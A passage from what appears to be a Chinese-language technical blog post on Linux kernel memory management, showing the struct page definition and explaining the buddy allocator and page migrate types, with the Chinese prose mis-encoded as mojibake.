class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Each physical page in the system has a struct page associated with</span></span><br><span class="line"><span class="comment"> * it to keep track of whatever it is we are using the page for at the</span></span><br><span class="line"><span class="comment"> * moment. Note that we have no way to track which tasks are using</span></span><br><span class="line"><span class="comment"> * a page, though if it is a pagecache page, rmap structures can tell us</span></span><br><span class="line"><span class="comment"> * who is mapping it.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The objects in struct page are organized in double word blocks in</span></span><br><span class="line"><span class="comment"> * order to allows us to use atomic double word operations on portions</span></span><br><span class="line"><span class="comment"> * of struct page. That is currently only used by slub but the arrangement</span></span><br><span class="line"><span class="comment"> * allows the use of atomic double word operations on the flags/mapping</span></span><br><span class="line"><span class="comment"> * and lru list pointers also.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">    <span class="comment">/* First double word block */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;        <span class="comment">/* Atomic flags, some possibly updated asynchronously</span></span><br><span class="line"><span class="comment">                                              æè¿°pageçš„çŠ¶æ€å’Œå…¶ä»–ä¿¡æ¯  */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span>  <span class="comment">/* If low bit clear, points to</span></span><br><span class="line"><span class="comment">                         * inode address_space, or NULL.</span></span><br><span class="line"><span class="comment">                         * If page mapped as anonymous</span></span><br><span class="line"><span class="comment">                         * memory, low bit is set, and</span></span><br><span class="line"><span class="comment">                         * it points to anon_vma object:</span></span><br><span class="line"><span class="comment">                         * see PAGE_MAPPING_ANON below.</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line">        <span class="type">void</span> *s_mem;            <span class="comment">/* slab first object ç°ç§»åŠ¨è‡³struct slabç»“æ„ä½“*/</span> </span><br><span class="line">        <span class="type">atomic_t</span> compound_mapcount;     <span class="comment">/* first tail page */</span></span><br><span class="line">        <span class="comment">/* page_deferred_list().next     -- second tail page */</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Second double word */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">            <span class="type">pgoff_t</span> index;      <span class="comment">/* Our offset within mapping.</span></span><br><span class="line"><span class="comment">            åœ¨æ˜ å°„çš„è™šæ‹Ÿç©ºé—´ï¼ˆvma_areaï¼‰å†…çš„åç§»ï¼›</span></span><br><span class="line"><span class="comment">            ä¸€ä¸ªæ–‡ä»¶å¯èƒ½åªæ˜ å°„ä¸€éƒ¨åˆ†ï¼Œå‡è®¾æ˜ å°„äº†1Mçš„ç©ºé—´ï¼Œ</span></span><br><span class="line"><span class="comment">            indexæŒ‡çš„æ˜¯åœ¨1Mç©ºé—´å†…çš„åç§»ï¼Œè€Œä¸æ˜¯åœ¨æ•´ä¸ªæ–‡ä»¶å†…çš„åç§»ã€‚ */</span></span><br><span class="line">            <span class="type">void</span> *freelist;     <span class="comment">/* sl[aou]b first free object */</span></span><br><span class="line">            <span class="comment">/* page_deferred_list().prev    -- second tail page */</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_HAVE_CMPXCHG_DOUBLE) &amp;&amp; \</span></span><br><span class="line"><span class="meta">    defined(CONFIG_HAVE_ALIGNED_STRUCT_PAGE)</span></span><br><span class="line">            <span class="comment">/* Used for cmpxchg_double in slub */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> counters;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Keep _refcount separate from slub cmpxchg_double</span></span><br><span class="line"><span class="comment">             * data.  As the rest of the double word is protected by</span></span><br><span class="line"><span class="comment">             * slab_lock but _refcount is not.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="type">unsigned</span> counters;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">                <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     * Count of ptes mapped in mms, to show</span></span><br><span class="line"><span class="comment">                     * when page is mapped &amp; limit reverse</span></span><br><span class="line"><span class="comment">                     * map searches.</span></span><br><span class="line"><span class="comment">                     * é¡µæ˜ å°„è®¡æ•°å™¨</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    <span class="type">atomic_t</span> _mapcount;</span><br><span class="line"></span><br><span class="line">                    <span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* SLUB */</span></span><br><span class="line">                        <span class="type">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line">                        <span class="type">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line">                        <span class="type">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">                    &#125;;</span><br><span class="line">                    <span class="type">int</span> units;      <span class="comment">/* SLOB */</span></span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * Usage count, *USE WRAPPER FUNCTION*</span></span><br><span class="line"><span class="comment">                 * when manual accounting. See page_ref.h</span></span><br><span class="line"><span class="comment">                 * é¡µå¼•ç”¨è®¡æ•°å™¨</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="type">atomic_t</span> _refcount;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> active;    <span class="comment">/* SLAB */</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Third double word block</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * WARNING: bit 0 of the first word encode PageTail(). That means</span></span><br><span class="line"><span class="comment">     * the rest users of the storage space MUST NOT use the bit to</span></span><br><span class="line"><span class="comment">     * avoid collision and false-positive PageTail().</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span>   <span class="comment">/* Pageout list, eg. active_list</span></span><br><span class="line"><span class="comment">                     * protected by zone-&gt;lru_lock !</span></span><br><span class="line"><span class="comment">                     * Can be used as a generic list</span></span><br><span class="line"><span class="comment">                     * by the page owner.</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">dev_pagemap</span> *<span class="title">pgmap</span>;</span> <span class="comment">/* ZONE_DEVICE pages are never on an</span></span><br><span class="line"><span class="comment">                        * lru or handled by a slab</span></span><br><span class="line"><span class="comment">                        * allocator, this points to the</span></span><br><span class="line"><span class="comment">                        * hosting device page map.</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>        <span class="comment">/* slub per cpu partial pages */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">next</span>;</span>      <span class="comment">/* Next partial slab */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line">            <span class="type">int</span> pages;      <span class="comment">/* Nr of partial slabs left */</span></span><br><span class="line">            <span class="type">int</span> pobjects;   <span class="comment">/* Approximate # of objects */</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="type">short</span> <span class="type">int</span> pages;</span><br><span class="line">            <span class="type">short</span> <span class="type">int</span> pobjects;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span>       <span class="comment">/* Used by SLAB</span></span><br><span class="line"><span class="comment">                         * when destroying via RCU</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line">        <span class="comment">/* Tail pages of compound page */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> compound_head; <span class="comment">/* If bit zero is set */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* First tail page only */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * On 64 bit system we have enough space in struct page</span></span><br><span class="line"><span class="comment">             * to encode compound_dtor and compound_order with</span></span><br><span class="line"><span class="comment">             * unsigned int. It can help compiler generate better or</span></span><br><span class="line"><span class="comment">             * smaller code on some archtectures.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> compound_dtor;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> compound_order;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> compound_dtor;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> compound_order;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_TRANSPARENT_HUGEPAGE) &amp;&amp; USE_SPLIT_PMD_PTLOCKS</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> __pad;    <span class="comment">/* do not overlay pmd_huge_pte</span></span><br><span class="line"><span class="comment">                         * with compound_head to avoid</span></span><br><span class="line"><span class="comment">                         * possible bit 0 collision.</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line">            <span class="type">pgtable_t</span> pmd_huge_pte; <span class="comment">/* protected by page-&gt;ptl */</span></span><br><span class="line">        &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Remainder is not double word aligned */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> private;      <span class="comment">/* Mapping-private opaque data:</span></span><br><span class="line"><span class="comment">                         * usually used for buffer_heads</span></span><br><span class="line"><span class="comment">                         * if PagePrivate set; used for</span></span><br><span class="line"><span class="comment">                         * swp_entry_t if PageSwapCache;</span></span><br><span class="line"><span class="comment">                         * indicates order in the buddy</span></span><br><span class="line"><span class="comment">                         * system if PG_buddy is set.</span></span><br><span class="line"><span class="comment">                         * ç§æœ‰æ•°æ®æŒ‡é’ˆï¼Œç”±åº”ç”¨åœºæ™¯ç¡®å®šå…¶å…·ä½“çš„å«ä¹‰</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_SPLIT_PTE_PTLOCKS</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ALLOC_SPLIT_PTLOCKS</span></span><br><span class="line">        <span class="type">spinlock_t</span> *ptl;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        <span class="type">spinlock_t</span> ptl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span>  <span class="comment">/* SL[AU]B: Pointer to slab */</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">mem_cgroup</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * On machines where all RAM is mapped into kernel address space,</span></span><br><span class="line"><span class="comment">     * we can simply calculate the virtual address. On machines with</span></span><br><span class="line"><span class="comment">     * highmem some memory is mapped into kernel virtual memory</span></span><br><span class="line"><span class="comment">     * dynamically, so we need a place to store that address.</span></span><br><span class="line"><span class="comment">     * Note that this field could be 16 bits on x86 ... ;)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Architectures with slow multiplication can define</span></span><br><span class="line"><span class="comment">     * WANT_PAGE_VIRTUAL in asm/page.h</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(WANT_PAGE_VIRTUAL)</span></span><br><span class="line">    <span class="type">void</span> *virtual;          <span class="comment">/* Kernel virtual address (NULL if</span></span><br><span class="line"><span class="comment">                       not kmapped, ie. highmem) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* WANT_PAGE_VIRTUAL */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KMEMCHECK</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * kmemcheck wants to track the status of each byte in a page; this</span></span><br><span class="line"><span class="comment">     * is a pointer to such a status block. NULL if not tracked.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">void</span> *shadow;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> LAST_CPUPID_NOT_IN_PAGE_FLAGS</span></span><br><span class="line">    <span class="type">int</span> _last_cpupid;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The struct page can be forced to be double word aligned so that atomic ops</span></span><br><span class="line"><span class="comment"> * on double words work. The SLUB allocator can make use of such a feature.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_HAVE_ALIGNED_STRUCT_PAGE</span></span><br><span class="line">    __aligned(<span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>åœ¨è¾ƒä½ç‰ˆæœ¬çš„å†…æ ¸ä¸­ï¼Œslabæ²¡æœ‰å•ç‹¬çš„ç»“æ„ä½“ï¼Œå…¨éƒ¨éƒ½æ˜¯é›†æˆåˆ°pageä¸­çš„ã€‚åç»­ç”±äºç©ºé—´å’Œå¯è¯»æ€§çš„åŸå› å°†slabå•ç‹¬æŠ½äº†å‡ºæ¥ã€‚pageç»“æ„å†…éƒ¨è¿˜æ˜¯æœ‰ç›¸å½“å¤šçš„slabæœ‰å…³å­—æ®µï¼Œä»¥åŠæ ‡è¯†é¡µé¢æ‰€å±å’Œå±æ€§çš„æ ‡å¿—ä½ã€‚</p><h1>Buddy Systemâ€”â€”ä¼™ä¼´ç³»ç»Ÿ</h1><blockquote><p>attrnba3å¤§ä½¬çš„åšå®¢ <a href="https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/#%E4%B8%89%E3%80%81buddy-system">https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/#ä¸‰ã€buddy-system</a></p></blockquote><p>Buddy Systemæ˜¯linuxå†…æ ¸ä»¥å†…å­˜é¡µä¸ºç²’åº¦çš„ä¸€ç§åº•å±‚ç®¡ç†æœºåˆ¶ã€‚åœ¨ä¸€ä¸ªzoneä¸­ä¼šæœ‰ä¸€ä¸ªfree_areaæ•°ç»„ç”¨æ¥å­˜å‚¨é¡µé¢ï¼Œä¸€èˆ¬å¤§å°ä¸º11ã€‚è¿™ä¸ªæ•°ç»„å°±æ˜¯ç»™buddy systemç®¡ç†ç”¨çš„ã€‚</p><p>buddy systemæœ¬è´¨ä¸Šä¹Ÿæ˜¯ä¸ºäº†è§£å†³é¢‘ç¹å†…å­˜åˆ†é…çš„é—®é¢˜è€Œç”Ÿçš„ã€‚å› ä¸ºå…¶å®ç†è®ºä¸Šæˆ‘ä»¬æœ‰pageåå°±å¯ä»¥è¿›è¡Œåˆ†é…äº†ï¼Œä½†æ˜¯è¿™ä¼šé¢ä¸´ç›¸å½“å¤šçš„é—®é¢˜ï¼Œæœ€é‡è¦çš„ä¸€ä¸ªé—®é¢˜ä¹‹ä¸€å°±æ˜¯ç¢ç‰‡ã€‚ç¢ç‰‡åˆ†ä¸ºå†…éƒ¨ç¢ç‰‡å’Œå¤–éƒ¨ç¢ç‰‡ï¼Œå¤–éƒ¨ç¢ç‰‡æŒ‡çš„æ˜¯é¡µç¢ç‰‡ï¼Œåˆ†é…3ä¸ªï¼Œé‡Šæ”¾ç¬¬ä¸€ä¸ªï¼Œè¿™æ ·å†æ¬¡åˆ†é…å¤§äº1çš„é¡µé¢ç¬¬ä¸€é¡µå°±æ°¸è¿œä¸ä¼šè¢«ç”¨åˆ°ã€‚å†…éƒ¨ç¢ç‰‡åˆ™æ˜¯æŒ‡é¡µå†…ç¢ç‰‡ï¼Œæ¯”å¦‚æˆ‘åªéœ€è¦å¾ˆå°‘çš„å­—èŠ‚å´åˆ†é…4kçš„é¡µé¢å¯¼è‡´å¤§é‡å†…å­˜é—²ç½®ã€‚è€Œbuddy systemå°±æ˜¯ä¸ºäº†è§£å†³å¤–éƒ¨ç¢ç‰‡è€Œç”Ÿçš„ã€‚ä¸‹é¢æ‰€è¯´çš„slab/slobåˆ™æ˜¯ä¸ºäº†è§£å†³å†…éƒ¨ç¢ç‰‡è€Œç”Ÿçš„ã€‚</p><p>buddy systemç»™å‡ºäº†ä¸€ç§å¾ˆèªæ˜çš„ç®¡ç†æ–¹æ¡ˆï¼Œå®ƒå°†ç‰©ç†å†…å­˜é¡µæŒ‰ç…§ä¸åŒçš„æ•°é‡ï¼ˆ2çš„å¹‚æ¬¡ï¼‰åˆ’åˆ†è¿ç»­çš„å—è¿›è¡Œåˆ†é…å¹¶ç”¨ä¸€ä¸ªæ•°ç»„è¿›è¡Œç®¡ç†ã€‚æ¯”å¦‚free_area[0]å°±æ˜¯å•ä¸ªpageè¿æ¥çš„é“¾è¡¨ï¼Œè€Œfree_area[1]åˆ™æ˜¯æ¯ä¸ªå…ƒç´ ç”±ä¸¤ä¸ªç‰©ç†è¿ç»­çš„pageæ„æˆçš„é“¾è¡¨ï¼Œä¾æ­¤ç±»æ¨ã€‚</p><p><img src="/images/linux_mem/buddy_system.png" alt="buddy_system.png"></p><p>åŒæ—¶ï¼Œbuddy systemå°†é¡µæ ‡è¯†ä¸ºäº†ä¸åŒçš„å±æ€§ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">migratetype</span> &#123;</span></span><br><span class="line">MIGRATE_UNMOVABLE,</span><br><span class="line">MIGRATE_MOVABLE,</span><br><span class="line">MIGRATE_RECLAIMABLE,</span><br><span class="line">MIGRATE_PCPTYPES,<span class="comment">/* the number of types on the pcp lists */</span></span><br><span class="line">MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CMA</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * MIGRATE_CMA migration type is designed to mimic the way</span></span><br><span class="line"><span class="comment"> * ZONE_MOVABLE works.  Only movable pages can be allocated</span></span><br><span class="line"><span class="comment"> * from MIGRATE_CMA pageblocks and page allocator never</span></span><br><span class="line"><span class="comment"> * implicitly change migration type of MIGRATE_CMA pageblock.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The way to use it is to change migratetype of a range of</span></span><br><span class="line"><span class="comment"> * pageblocks to MIGRATE_CMA which can be done by</span></span><br><span class="line"><span class="comment"> * __free_pageblock_cma() function.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">MIGRATE_CMA,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">MIGRATE_ISOLATE,<span class="comment">/* can&#x27;t allocate from here */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">MIGRATE_TYPES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™äº›å±æ€§å¦‚ä¸‹ï¼š</p><blockquote><ul class="lvl-1"><li class="lvl-2"><p>ä¸å¯ç§»åŠ¨é¡µï¼šåœ¨å†…å­˜ä¸­æœ‰å›ºå®šä½ç½®ï¼Œä¸èƒ½ç§»åŠ¨åˆ°å…¶ä»–åœ°æ–¹ã€‚å†…æ ¸ä¸­ä½¿ç”¨çš„é¡µå¤§éƒ¨åˆ†æ˜¯å±äºè¿™ç§ç±»å‹ã€‚</p></li><li class="lvl-2"><p>å¯å›æ”¶é¡µï¼šä¸èƒ½ç›´æ¥ç§»åŠ¨ï¼Œä½†å¯ä»¥åˆ é™¤ï¼Œé¡µä¸­çš„å†…å®¹å¯ä»¥ä»æŸäº›æºä¸­é‡æ–°ç”Ÿæˆã€‚ä¾‹å¦‚ï¼Œé¡µå†…å®¹æ˜¯æ˜ å°„åˆ°æ–‡ä»¶æ•°æ®çš„é¡µå°±å±äºè¿™ç§ç±»å‹ã€‚å¯¹äºè¿™ç§ç±»å‹ï¼Œåœ¨å†…å­˜çŸ­ç¼º(åˆ†é…å¤±è´¥)æ—¶ï¼Œä¼šå‘èµ·å†…å­˜å›æ”¶ï¼Œå°†è¿™ç±»å‹é¡µè¿›è¡Œå›å†™é‡Šæ”¾ã€‚</p></li><li class="lvl-2"><p>å¯ç§»åŠ¨é¡µï¼šå¯éšæ„ç§»åŠ¨ï¼Œç”¨æˆ·ç©ºé—´çš„è¿›ç¨‹ä½¿ç”¨çš„æ²¡æœ‰æ˜ å°„å…·ä½“ç£ç›˜æ–‡ä»¶çš„é¡µå°±å±äºè¿™ç§ç±»å‹(æ¯”å¦‚å †ã€æ ˆã€shmemå…±äº«å†…å­˜ã€åŒ¿åmmapå…±äº«å†…å­˜)ï¼Œå®ƒä»¬æ˜¯é€šè¿‡è¿›ç¨‹é¡µè¡¨æ˜ å°„çš„ï¼ŒæŠŠè¿™äº›é¡µå¤åˆ¶åˆ°æ–°ä½ç½®æ—¶ï¼Œåªè¦æ›´æ–°è¿›ç¨‹é¡µè¡¨å°±å¯ä»¥äº†ã€‚ä¸€èˆ¬è¿™äº›é¡µæ˜¯ä»é«˜ç«¯å†…å­˜ç®¡ç†åŒºè·å–ã€‚</p></li></ul></blockquote><p>buddy systemæ¯ä¸ªfree_areaå…ƒç´ éƒ½æœ‰ä¸€ä¸ª<code>free_list[4]</code>é“¾è¡¨æŒ‡é’ˆæ•°ç»„ï¼Œå¯¹åº”äº†å››ç§ä¸åŒçš„é¡µå±æ€§ã€‚æ¯ä¸ªé“¾ä¸Šçš„å±æ€§éƒ½ä¸€è‡´ï¼Œæ¯ä¸ªfree_areaçš„è¿ç»­é¡µæ•°é‡ä¹Ÿéƒ½ä¸€è‡´ã€‚</p><h2 id="åˆ†é…å’Œé‡Šæ”¾é€»è¾‘">åˆ†é…å’Œé‡Šæ”¾é€»è¾‘</h2><p>åœ¨è¯·æ±‚ç©ºé—´çš„æ—¶å€™ï¼Œbuddy systemé¦–å…ˆä¼šå°†éœ€æ±‚å‘2çš„å¹‚æ¬¡å¯¹é½ï¼Œç„¶åå»å¯¹åº”çš„ä¸‹æ ‡å–å‡ºè¿ç»­ç©ºé—´ã€‚</p><ul class="lvl-0"><li class="lvl-2"><p>åŒ¹é…å±æ€§å’Œå¤§å°ï¼Œæ‰¾åˆ°å¯¹åº”çš„free_listé“¾è¡¨å¾€ä¸‹æ‘˜</p></li><li 